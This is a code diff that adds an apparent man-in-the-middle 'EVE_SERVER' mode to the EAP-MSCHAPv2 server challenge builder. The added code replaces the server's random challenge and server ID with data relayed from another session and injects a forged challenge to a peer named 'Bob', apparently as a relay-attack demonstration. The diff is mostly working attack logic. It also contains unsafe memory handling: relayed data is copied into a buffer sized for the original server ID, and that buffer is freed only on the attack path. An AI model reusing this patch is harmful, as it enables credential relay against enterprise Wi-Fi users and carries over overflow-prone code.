@@ -13,6 +13,8 @@
 #include "crypto/random.h"
 #include "eap_i.h"
 
+#include "eap_example.h"
+
 
 struct eap_mschapv2_hdr {
 	u8 op_code; /* MSCHAPV2_OP_* */
@@ -102,6 +104,43 @@ static struct wpabuf * eap_mschapv2_build_challenge(
 	struct eap_mschapv2_hdr *ms;
 	size_t ms_len;
 
+	enum local_mitm_state {HACK, SKIP} lm_state = SKIP;
+	struct instance_data * self = NULL;
+	char *cur_server_id = 0;
+	int cur_server_id_len = 0;
+
+	if (sm->server_id_len) {
+		cur_server_id = (char *) os_strdup((char *)sm->server_id);
+		cur_server_id_len = sm->server_id_len;
+	}
+
+	if (cur_server_id == NULL && cur_server_id_len) {
+		wpa_printf(MSG_ERROR, "MITM: Failed to allocate memory"
+			   " for cur_server_id");
+		data->state = FAILURE;
+		return NULL;
+	}
+
+	if (eap_example_get_instance_name(sm) == EVE_SERVER) {
+		self = eap_example_get_instance_data(sm);
+
+		if (self->mitm_protocol_state == 0x2 &&
+		    self->mitm_data == 0) {
+			self->mitm_protocol_state = 0x3;
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Can't find received packet");
+			self = NULL;
+			lm_state = SKIP;
+		}
+		else {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Start generate "
+				   "forged MSCHAPv2 Challenge "
+				   " to Bob Peer");
+			lm_state = HACK;
+		}
+	}
+
 	if (!data->auth_challenge_from_tls &&
 	    random_get_bytes(data->auth_challenge, CHALLENGE_LEN)) {
 		wpa_printf(MSG_ERROR, "EAP-MSCHAPV2: Failed to get random "
@@ -110,7 +149,17 @@ static struct wpabuf * eap_mschapv2_build_challenge(
 		return NULL;
 	}
 
-	ms_len = sizeof(*ms) + 1 + CHALLENGE_LEN + sm->server_id_len;
+	if (lm_state == HACK) {
+		os_memcpy(data->auth_challenge, self->mitm_data->buf,
+					       CHALLENGE_LEN);
+		cur_server_id_len = self->mitm_data->used - CHALLENGE_LEN;
+		os_memcpy(cur_server_id, self->mitm_data->buf + CHALLENGE_LEN,
+				         cur_server_id_len);
+		wpa_printf(MSG_DEBUG,
+			   "MITM: Inject forged MSCHAPv2 Challenge ");
+	}
+
+	ms_len = sizeof(*ms) + 1 + CHALLENGE_LEN + cur_server_id_len;
 	req = eap_msg_alloc(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, ms_len,
 			    EAP_CODE_REQUEST, id);
 	if (req == NULL) {
@@ -132,7 +181,16 @@ static struct wpabuf * eap_mschapv2_build_challenge(
 		wpabuf_put(req, CHALLENGE_LEN);
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Challenge",
 		    data->auth_challenge, CHALLENGE_LEN);
-	wpabuf_put_data(req, sm->server_id, sm->server_id_len);
+	wpabuf_put_data(req, cur_server_id, cur_server_id_len);
+
+	if (lm_state == HACK) {
+		wpa_printf(MSG_DEBUG,
+			   "MITM: End generate "
+			   "forged MSCHAPv2 Challenge "
+			   " to Bob Peer");
+		self->mitm_protocol_state = 0x4;
+		os_free(cur_server_id);
+	}
 
 	return req;
 }
